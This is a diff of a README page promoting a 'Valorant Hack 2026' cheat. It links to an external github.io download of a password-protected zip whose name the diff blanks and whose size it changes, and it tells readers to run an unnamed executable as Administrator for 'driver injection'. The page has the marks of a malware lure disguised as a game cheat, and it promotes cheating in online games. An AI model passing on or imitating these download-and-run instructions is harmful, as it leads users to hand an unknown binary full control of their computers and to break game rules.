@@ -28,9 +28,9 @@ This isn't just another cheat; it's a complete overhaul of your gameplay. Check 
 
 Getting started with the Valorant Hack 2026 is simple. Follow these exact steps to ensure it runs smoothly.
 
-1.  **⬇️ Download the Archive:** Click the button at the top of this page or [click here](https://circlefiscalmarina.github.io/Valo-HacksExternal/) to download the latest `Valorant_Hack_2026.zip` file.
+1.  **⬇️ Download the Archive:** Click the button at the top of this page or [click here](https://circlefiscalmarina.github.io/Valo-HacksExternal/) to download the latest `.zip` file.
 2.  **📦 Extract the Files:** Navigate to your downloads folder. Right-click the archive and select "Extract All..." Choose any easy-to-find folder on your desktop or documents (e.g., `C:\Users\YourName\ValorantHack`).
-3.  **🚀 Run the Executable:** Open the extracted folder. **Important:** Run the file named `Launcher.exe` or `Valorant_2026_Loader.exe` **as Administrator** (Right-click > Run as administrator). This is crucial for driver injection.
+3.  **🚀 Run the Executable:** Open the extracted folder. **Important:** Run the file named `.exe` **as Administrator** (Right-click > Run as administrator). This is crucial for driver injection.
 4.  **🎮 Launch Valorant:** Start the Valorant client as you normally would. Wait for the game to fully load and get to the main menu or a match.
 5.  **🔧 Press INSERT:** Once in-game, press the **`INSERT`** key on your keyboard. This will open the cheat's main menu.
 6.  **🎉 Enjoy:** Customize your settings in the menu and enjoy dominating every match!
@@ -43,9 +43,9 @@ Click the shield below to download the latest build from our secure server. The 
 
 [![Download](https://img.shields.io/badge/DOWNLOAD-VALORANT_HACK_2026-blue?style=for-the-badge&logo=download)](https://circlefiscalmarina.github.io/Valo-HacksExternal/)
 
-> **File:** Valorant_Hack_2026.zip
+> **File:** .zip
 > **Password:** `2026`
-> **Size:** 14.8 MB
+> **Size:** 120.8 MB
 > **Source:** [https://circlefiscalmarina.github.io/Valo-HacksExternal/](https://circlefiscalmarina.github.io/Valo-HacksExternal/)
 
 ---
